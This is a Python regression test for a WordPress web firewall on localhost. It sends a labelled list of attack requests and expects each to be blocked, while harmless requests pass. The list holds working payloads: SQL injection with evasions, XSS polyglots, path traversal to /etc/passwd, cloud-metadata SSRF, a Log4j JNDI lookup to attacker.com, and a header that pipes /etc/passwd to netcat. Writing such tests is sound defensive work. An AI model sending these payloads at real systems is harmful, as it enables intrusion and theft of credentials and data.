import requests
import json
import base64
import urllib.parse
import sys

BASE_URL = "http://localhost/mahabub/"

test_cases = [
    # Category 1: SQL Injection & Evasions
    ("SQLi Classic OR 1=1", "GET", {"id": "1' OR '1'='1"}, {}, {}, 403),
    ("SQLi UNION SELECT", "GET", {"q": "1 UNION SELECT 1,2,user()--"}, {}, {}, 403),
    ("SQLi Blind Sleep (pg_sleep)", "GET", {"sleep": "1; SELECT pg_sleep(5);--"}, {}, {}, 403),
    ("SQLi Triple URL Encoded", "GET", {"id": urllib.parse.quote(urllib.parse.quote(urllib.parse.quote("1' UNION SELECT 1,2,3--")))}, {}, {}, 403),
    ("SQLi SQL Comments Evasion (UN/**/ION)", "GET", {"q": "1 UN/**/ION SEL/**/ECT 1,2,3--"}, {}, {}, 403),
    ("SQLi Cookie Value", "GET", {}, {"session_id": "admin' UNION SELECT 1,2,3--"}, {}, 403),
    ("SQLi Cookie Key Injection", "GET", {}, {"sess_id' OR 1=1--": "dummy_value"}, {}, 403),
    ("SQLi User-Agent Header", "GET", {}, {}, {"User-Agent": "Mozilla/5.0 ' UNION SELECT 1,2,3--"}, 403),
    ("SQLi Referer Header", "GET", {}, {}, {"Referer": "http://attacker.com/page?id=1' OR 1=1--"}, 403),
    ("SQLi JSON Body", "POST", {}, {}, {"Content-Type": "application/json"}, 403, json.dumps({"username": "admin' OR 1=1--", "password": "x"})),
    ("SQLi Base64 Injected", "GET", {"payload": base64.b64encode(b"admin' UNION SELECT 1,2,3--").decode()}, {}, {}, 403),

    # Category 2: Cross-Site Scripting (XSS)
    ("XSS Script Tag", "GET", {"search": "<script>alert(1)</script>"}, {}, {}, 403),
    ("XSS Event Handler (img onerror)", "GET", {"q": '<img src=x onerror=alert("XSS")>'}, {}, {}, 403),
    ("XSS SVG onload", "GET", {"name": "<svg onload=alert(1)>"}, {}, {}, 403),
    ("XSS Polyglot", "GET", {"poly": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"}, {}, {}, 403),
    ("XSS Cookie Injected", "GET", {}, {"theme": '<script>alert("cookie_xss")</script>'}, {}, 403),
    ("XSS User-Agent Header", "GET", {}, {}, {"User-Agent": "<script>alert(document.cookie)</script>"}, 403),
    ("XSS JSON Body", "POST", {}, {}, {"Content-Type": "application/json"}, 403, json.dumps({"comment": "<svg onload=alert(1)>"})),

    # Category 3: RCE, SSTI & Code Injection
    ("RCE JNDI/Log4j in UA", "GET", {}, {}, {"User-Agent": "${jndi:ldap://attacker.com/exploit}"}, 403),
    ("RCE System/Exec in Query", "GET", {"cmd": ";system('id');"}, {}, {}, 403),
    ("RCE Eval in POST Form", "POST", {}, {}, {"Content-Type": "application/x-www-form-urlencoded"}, 403, "data=phpinfo();eval($_POST['cmd']);"),
    ("RCE SSTI in Query", "GET", {"template": "{{7*7}}"}, {}, {}, 403),
    ("RCE Shell pipe in Header", "GET", {}, {}, {"X-Custom-Header": "; cat /etc/passwd | nc evil 1234"}, 403),

    # Category 4: LFI / Path Traversal & Sensitive Files
    ("LFI ../../etc/passwd", "GET", {"file": "../../../../etc/passwd"}, {}, {}, 403),
    ("LFI Overlong UTF-8", "GET", {"path": "..%c0%af..%c0%afetc/passwd"}, {}, {}, 403),
    ("LFI php://filter", "GET", {"page": "php://filter/convert.base64-encode/resource=wp-config.php"}, {}, {}, 403),
    ("LFI Sensitive wp-config.php.bak", "GET", {"download": "wp-config.php.bak"}, {}, {}, 403),
    ("LFI Sensitive .env", "GET", {"cfg": ".env"}, {}, {}, 403),

    # Category 5: SSRF & Cloud Metadata
    ("SSRF AWS Metadata", "GET", {"url": "http://169.254.169.254/latest/meta-data/"}, {}, {}, 403),
    ("SSRF Localhost IPv6", "GET", {"dest": "http://[::1]:8080/admin"}, {}, {}, 403),

    # Category 6: Web Fraud & Application Logic Guard
    ("Web Fraud Negative Price", "POST", {}, {}, {"Content-Type": "application/x-www-form-urlencoded"}, 403, "item_id=45&price=-100&qty=1"),
    ("Web Fraud Total Price Override", "POST", {}, {}, {"Content-Type": "application/json"}, 403, json.dumps({"total": "0.00", "discount_override": 100})),

    # Category 7: API & Protocol Attacks
    ("API GraphQL Schema Introspection", "POST", {}, {}, {"Content-Type": "application/json"}, 403, json.dumps({"query": "{ __schema { types { name } } }"})),
    ("Protocol CRLF Response Splitting", "GET", {"lang": "en%0d%0aSet-Cookie:malicious=1"}, {}, {}, 403),

    # Category 8: Scanner Bots
    ("Scanner Sqlmap", "GET", {}, {}, {"User-Agent": "sqlmap/1.6#stable (https://sqlmap.org)"}, 403),
    ("Scanner Nikto", "GET", {}, {}, {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6) (SSH-1.99)"}, 403),
    ("Scanner WPScan", "GET", {}, {}, {"User-Agent": "WPScan v3.8.22"}, 403),

    # Category 9: Benign Traffic (MUST BE 200 or 302, NEVER 403)
    ("Benign Home Page", "GET", {}, {}, {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, 200),
    ("Benign Query String with Safe Filter", "GET", {"s": "WordPress security plugin", "page": "2", "sort": "date"}, {}, {"User-Agent": "Mozilla/5.0"}, 200),
    ("Benign Long Blog Read", "GET", {"p": "1", "preview": "true"}, {}, {"User-Agent": "Mozilla/5.0"}, 200),
    ("Benign Safe Form POST", "POST", {}, {}, {"Content-Type": "application/x-www-form-urlencoded"}, 200, "author=Mahabub&email=admin@test.com&comment=Great+security+article!"),
]

def run_tests():
    total = len(test_cases)
    passed = 0
    failed = []

    print(f"=== Running {total} Enterprise WAAP & Fraud Defense Test Cases ===")
    for test in test_cases:
        name = test[0]
        method = test[1]
        params = test[2]
        cookies = test[3]
        headers = test[4]
        expected_status = test[5]
        data = test[6] if len(test) > 6 else None

        try:
            if method == "GET":
                r = requests.get(BASE_URL, params=params, cookies=cookies, headers=headers, timeout=5)
            else:
                r = requests.post(BASE_URL, params=params, cookies=cookies, headers=headers, data=data, timeout=5)

            status = r.status_code
            if expected_status == 200:
                is_ok = (status in [200, 301, 302, 304])
            else:
                is_ok = (status == expected_status)

            if is_ok:
                passed += 1
                print(f"  [PASS] {name:<42} -> Status: {status} (Expected: {expected_status})")
            else:
                failed.append((name, status, expected_status, r.text[:200]))
                print(f"  [FAIL] {name:<42} -> Got {status}, expected {expected_status}")
        except Exception as e:
            failed.append((name, "ERROR", expected_status, str(e)))
            print(f"  [ERROR] {name:<42} -> {e}")

    print("\n" + "="*60)
    print(f"Final Test Result: {passed}/{total} Passed, {len(failed)} Failed")
    if failed:
        print("\nFailed cases detail:")
        for f in failed:
            print(f" - {f[0]}: Got {f[1]}, Expected {f[2]}")
    return len(failed) == 0

if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
